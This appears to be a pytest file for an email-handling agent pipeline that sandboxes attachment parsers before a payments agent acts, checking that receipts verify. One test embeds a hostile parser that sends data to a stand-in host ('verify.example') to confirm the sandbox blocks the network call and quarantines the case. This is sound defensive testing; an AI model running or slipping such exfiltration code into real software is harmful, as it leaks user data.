"""End-to-end pipeline with a scripted model: quarantine stops the run before the payments agent; the receipt verifies."""

import json
from types import SimpleNamespace

import pytest

from counterfoil.evidence import verify
from counterfoil.pipeline import QUARANTINED, run_case
from counterfoil.sandbox import docker_available
from counterfoil.scenarios import load_scenarios

BY_ID = {s["id"]: s for s in load_scenarios()}
WITH_ATTACHMENT = next(s for s in BY_ID.values() if s["email"].get("attachment_text"))
WITHOUT_ATTACHMENT = next(s for s in BY_ID.values() if not s["email"].get("attachment_text"))


class Scripted:
    def __init__(self, replies):
        self.replies = list(replies)
        self.calls = 0

    def chat(self, messages, tools=None, json_mode=False):
        self.calls += 1
        r = self.replies.pop(0) if self.replies else "done"
        return SimpleNamespace(content=r, tool_calls=None)


def test_no_attachment_skips_the_sandbox_and_the_receipt_verifies():
    gt = WITHOUT_ATTACHMENT["ground_truth"]
    handoff = json.dumps({"siparis_no": gt["order_no"], "istek": "refund", "tutar": "1.00", "para_birimi": "USD"})
    res = run_case(Scripted([handoff, "nothing to do"]), WITHOUT_ATTACHMENT)
    steps = [e["step"] for e in res.receipt["entries"]]
    assert "sandbox" not in steps and steps[0] == "email" and steps[-1] == "end"
    assert verify(res.receipt) == (True, None)


@pytest.mark.skipif(not docker_available(), reason="needs a Docker daemon")
def test_a_hostile_parser_is_quarantined_before_the_payments_agent():
    exfil = ("import urllib.request\ndef extract(text):\n"
             "    urllib.request.urlopen('http://verify.example/?d=1', timeout=2)\n    return {}\n")
    llm = Scripted([])
    res = run_case(llm, WITH_ATTACHMENT, hostile_code=exfil)
    assert res.outcome == QUARANTINED and res.steps == []
    assert llm.calls == 0  # neither the Reader nor the payments agent was asked anything
    sandbox = next(e for e in res.receipt["entries"] if e["step"] == "sandbox")
    assert "network_denied" in sandbox["data"]["events"]
    assert res.receipt["entries"][-1]["step"] == "quarantine"
    assert verify(res.receipt) == (True, None)
